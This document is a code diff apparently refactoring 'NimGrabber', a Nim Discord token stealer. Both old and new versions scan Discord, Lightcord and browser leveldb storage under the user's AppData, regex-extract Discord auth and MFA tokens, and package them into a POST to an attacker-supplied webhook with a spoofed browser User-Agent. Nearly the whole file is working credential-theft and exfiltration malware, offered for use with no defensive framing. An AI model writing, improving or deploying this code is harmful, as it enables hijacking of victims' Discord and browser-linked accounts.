@@ -1,10 +1,8 @@
 # ============ #
 # NullCode1337 #
 # ============ #
-import json, puppy, os, re
-from sequtils import deduplicate
-from strutils import strip
-from strutils import splitLines
+import json, puppy, os, regex, strutils
+from sequtils import deduplicate, concat
 
 # User fillable variables
 # -----------------------
@@ -15,55 +13,49 @@ let
 # Do not touch the following
 # --------------------------
 var
-  roaming = getenv("appdata")
-  local = getenv("localappdata")
   tkpaths: seq[string] = @[]
-  tokens*: seq[string] = @[]
+  tokens : seq[string] = @[]
   hooktks = ""
+
+let 
+  roaming = getenv("appdata")
+  local   = getenv("localappdata")
+  begin: string = "<@" & $userid & ">\n" & "**__Tokens grabbed by NimGrabber__**: \n"
+  reg     = [re"(?i-u)[\w-]{24}\.[\w-]{6}\.[\w-]{27}", re"(?i-u)mfa\.[\w-]{84}"]
   
-let paths = [
-  roaming & r"\Discord",                        roaming & r"\discordptb", roaming & r"\discordcanary",
+  paths = [roaming & r"\Discord",               roaming & r"\discordptb",     roaming & r"\discordcanary",
   roaming & r"\Lightcord",                      local & r"\Google\Chrome\User Data\Default",
   local & r"\Microsoft\Edge\User Data\Default", roaming & r"\Opera Software\Opera Stable",
   roaming & r"\Opera Software\Opera GX Stable", local & r"\BraveSoftware\Brave-Browser\User Data\Default",
-  local & r"\Vivaldi\User Data\Default",        local & r"\Yandex\YandexBrowser\User Data\Default"
-]
+  local & r"\Vivaldi\User Data\Default",        local & r"\Yandex\YandexBrowser\User Data\Default"]
 
-let 
-  begin: string = "<@" & $userid & ">\n" & "**__Tokens grabbed by NimGrabber__**: \n"
-  regex = [re"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", re"mfa\.[\w-]{84}"]
-  
-proc getTokens(path: string): seq[string] =
-    if dirExists(path) == true:
-        var path = path & r"\Local Storage\leveldb"
-        try: 
-            setCurrentDir(path) 
-            for file in walkDirRec path:
-                if file.match re".*\.log":
-                    tkpaths.add(file)
-                if file.match re".*\.ldb":
-                    tkpaths.add(file)
-        except OSError: 
-            return @["no"]
-        for tk in tkpaths:
-            var contents = readfile(tk)
-            var split = contents.splitLines()
-            for line in split:
-                for r in regex:
-                    tokens.add(findAll(line, r))
-        return tokens
-    else: 
-        return @["no"]
+for path in paths:
+   var path = path & r"\Local Storage\leveldb"
+   if dirExists(path):
+   
+      try: ## Stage 1: Finding paths for all the files
+         setCurrentDir(path)
+         for file in walkDirRec path:
+            if file.endswith("log"):   
+               tkpaths.add(file)
+            elif file.endswith("ldb"): 
+               tkpaths.add(file)
+            else: continue
+      except OSError: continue
+      
+      for file in tkpaths: ## Stage 2: We do some regexing
+         var cont = file.readFile
+         cont = cont.replace("\n", "")
+         for r in reg:
+            for f in findAll(cont, r):
+               tokens.add cont[f.boundaries]
+               
+   else: continue
 
-for a in paths: 
-    var x: seq[string] = getTokens(a)
-    if x[0] == "no": 
-        continue
-    
-if tokens.len == 0: # Just in case no token ever gets found 
+if tokens.len == 0: ## Just in case no token ever gets found 
     tokens.add("No tokens found!") 
     
-tokens = tokens.deduplicate
+tokens = tokens.deduplicate ## Prepare tokens for uploading
 for c in tokens: hooktks.add(c & "\n")
 hooktks = "```\n" & hooktks.strip(leading=false) & "```"
 var data = %*{ 
@@ -71,17 +63,17 @@ var data = %*{
     "username": "Nim666" 
 }
 
-let post = Request(
-  url: parseUrl(webhook),
-  verb: "POST",
-  headers: @[Header(
-    key: "Content-Type", 
-    value: "application/json"
-  ), Header(
-    key: "User-Agent",
-    value: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
-  )],
-  body: $data
+let post = Request( ## Upload said tokens
+   url: parseUrl(webhook),
+   verb: "POST",
+   headers: @[Header(
+      key: "Content-Type", 
+      value: "application/json"
+   ), Header(
+      key: "User-Agent",
+      value: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
+   )],
+   body: $data
 )
 
 # Nice and fluffy bandage
